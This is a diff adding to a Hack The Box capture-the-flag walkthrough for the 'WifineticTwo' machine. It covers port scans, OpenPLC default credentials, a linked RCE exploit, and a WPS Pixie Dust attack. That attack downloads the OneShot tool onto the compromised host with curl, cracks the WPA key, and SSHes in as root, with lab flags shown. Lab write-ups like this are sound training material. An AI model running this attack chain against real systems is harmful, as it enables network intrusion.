@@ -3,11 +3,11 @@ title: WifineticTwo
 banner: /avatars/wifinetic-two.webp
 difficulty: medium
 os: linux
-pwnDate: 2024-04-04
+pwnDate: 2024-04-05
 releaseDate: 2024-03-16
 slug: "wifinetic-two"
-isPublished: false
-shareLink: https://www.hackthebox.com/achievement/machine/
+isPublished: true
+shareLink: https://www.hackthebox.com/achievement/machine/701907/593
 ---
 
 import Browser from "@/components/Browser.astro" 
@@ -15,18 +15,41 @@ import Browser from "@/components/Browser.astro"
 ## Enumeration
 
 ```bash
-sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.8 -oG allPorts
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.7 -oG allPorts
+
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
 ```
 
 ```bash
-sudo nmap -p22,80 -sCV 10.10.11.8 -oN targeted
+sudo nmap -p22,80 -sCV 10.10.11.7 -oN targeted
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
 ```
 
-```bash
-sudo echo "10.10.11.8 wifinetic-two.htb" >> /etc/hosts
-```
+<Browser
+  url="google.com"
+  src="/walkthroughs/wifinetic-two/0.png"
+/>
+
+`openplc:openplc`
+
+openplc rce poc
+
+https://sploitus.com/exploit?id=F798DF29-65C2-59BE-A8F7-B50C3F4CA4D2
+
+[exploit](https://github.com/thewhiteh4t/cve-2021-31630/tree/main)
 
 ## Foothold
+
+```bash
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
+cat /root/user.txt
+5962b4c07d2a287964cb03c07b58fe5a
+```
 
 ## Post Exploitation
 
@@ -34,6 +57,164 @@ once inside we proceed to upgrade our shell following [hacktricks](https://book.
 
 ## Lateral Movement
 
-## Privilege Escalation
+perdida de tiempo
 
-## Extra
+```bash
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# ls
+active_program  lib             openplc.py   scripts       webserver.py
+core            monitoring.py   openplc.pyc  static
+dnp3.cfg        monitoring.pyc  pages.py     st_files
+iec2c           openplc.db      pages.pyc    st_optimizer
+```
+
+```bash
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# file openplc.db
+openplc.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 507, database pages 10, cookie 0xc, schema 4, UTF-8, version-valid-for 507
+```
+
+```bash
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# sqlite3 openplc.db
+sqlite> .tables
+Programs   Settings   Slave_dev  Users
+sqlite> .schema Users
+CREATE TABLE IF NOT EXISTS "Users" (
+	`user_id`	INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
+	`name`	TEXT NOT NULL,
+	`username`	TEXT NOT NULL UNIQUE,
+	`email`	TEXT,
+	`password`	TEXT NOT NULL,
+	`pict_file`	TEXT
+);
+sqlite> select * from Users;
+10|OpenPLC User|openplc|openplc@openplc.com|openplc|
+```
+
+fin perdida de tiempo
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# iw dev wlan0 scan
+BSS 02:00:00:00:01:00(on wlan0)
+	last seen: 4438.704s [boottime]
+	TSF: 1712316111136774 usec (19818d, 11:21:51)
+	freq: 2412
+	beacon interval: 100 TUs
+	capability: ESS Privacy ShortSlotTime (0x0411)
+	signal: -30.00 dBm
+	last seen: 0 ms ago
+	Information elements from Probe Response frame:
+	SSID: plcrouter
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
+	DS Parameter set: channel 1
+	ERP: Barker_Preamble_Mode
+	Extended supported rates: 24.0 36.0 48.0 54.0 
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Supported operating classes:
+		 * current operating class: 81
+	Extended capabilities:
+		 * Extended Channel Switching
+		 * SSID List
+		 * Operating Mode Notification
+	WPS:	 * Version: 1.0
+		 * Wi-Fi Protected Setup State: 2 (Configured)
+		 * Response Type: 3 (AP)
+		 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
+		 * Manufacturer:  
+		 * Model:  
+		 * Model Number:  
+		 * Serial Number:  
+		 * Primary Device Type: 0-00000000-0
+		 * Device name:  
+		 * Config methods: Label, Display, Keypad
+		 * Version2: 2.0
+```
+
+```bash
+git clone https://github.com/nikita-yfh/OneShot-C.git
+```
+
+```bash
+make
+```
+
+```bash
+python3 -m http.server 80
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# curl http://10.10.14.52/oneshot -o oneshot
+```
+
+
+```bash
+chmod +x oneshot
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# ip a s wlan0
+7: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
+    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# ./oneshot -b 02:00:00:00:01:00 -K -i wlan0
+[*] Running wpa_supplicant...
+[*] Trying pin 12345670...
+[*] Scanning...
+[*] Authenticating...
+[+] Authenticated
+[*] Associating with AP...
+[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
+[*] Received Identity Request
+[*] Sending Identity Response...
+[*] Received WPS Message M1
+[P] E-Nonce: a0d569681ac26464c06619c6f4952ff1
+[*] Building Message M2
+[P] PKR: 0d5df60c919e69d168d373e2074601bb3c2369fa30ee5daf59a29fe7fea477613474c08a491ee3743117d33c1c9e2eb1d27f51082ba6141fe2a3f19dc8af231a225e158fea97fa1669c7c327b5215501b66689b058de25c8febb174ea7f6240c035d97a37a832dde52c6d20d4b2c35f65e6a6aa8463d79f537342123c33168eb086d76f1161038d9180ebc96db01fffb69cbf34e61916709c3ce30647fbaef4d75b11611ec64b5c49dd010778f4c1b8ebf19e532f9a7101d4840861a7592d6a4
+[P] PKE: f831b763442dc9a494afbbc7e164063a946ff302eb3b4003ee596adda13e763316c714a046fb103d22d55fe7aabeb78f16cc4435727c0f20ef296afe8961cf1d50e827ad9d3ba2da31ccc4eef295a617ca86e01554fe53c58b27d1812526a886240e9de587a33a648ea0755a9e021b0c8d8bbcd0f90f286bdd0e1139f01b23fc67bafd6d6a907f9bdafeb0c1003ecb41a051019d673a85fbbb0cd94e2db9f3eac99d9402ad3572775dfd313f2dd11f06c1f7d02d73d70047fdd0c1e4e7b1dafe
+[P] Authkey: 2f82ad0a7cf52c09d4fc7150139e9e59ceefde53d327ffe9b6fb1b56ef2e4601
+[*] Received WPS Message M3
+[P] E-Hash1: e0af2f68da49c5289272c9e895c6e61c0ca5cc67c2dd79992df06a343e1242d6
+[P] E-Hash2: 465ca81126a0d95a067bb581368e2db8db19c5de1df65a36785848a9b9cacf96
+[*] Building Message M4
+[*] Received WPS Message M5
+[*] Building Message M6
+[*] Received WPS Message M7
+[+] WPS PIN: 12345670
+[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
+[+] AP SSID: plcrouter
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! > config
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# cat config 
+network={
+	ssid="plcrouter"
+	#psk="NoWWEDoKnowWhaTisReal123!"
+	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
+}
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# wpa_supplicant -B -c config -i wlan0
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+nl80211: Could not set interface 'p2p-dev-wlan0' UP
+nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
+p2p-dev-wlan0: Failed to initialize driver interface
+p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
+P2P: Failed to enable P2P Device interface
+```
+
+```bash
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
+root@attica03:/opt/PLC/OpenPLC_v3/webserver# ssh root@192.168.1.1
+root@ap:~# cat root.txt
+33445bbba1381eb24ca2d19d0c51fa0d
+```
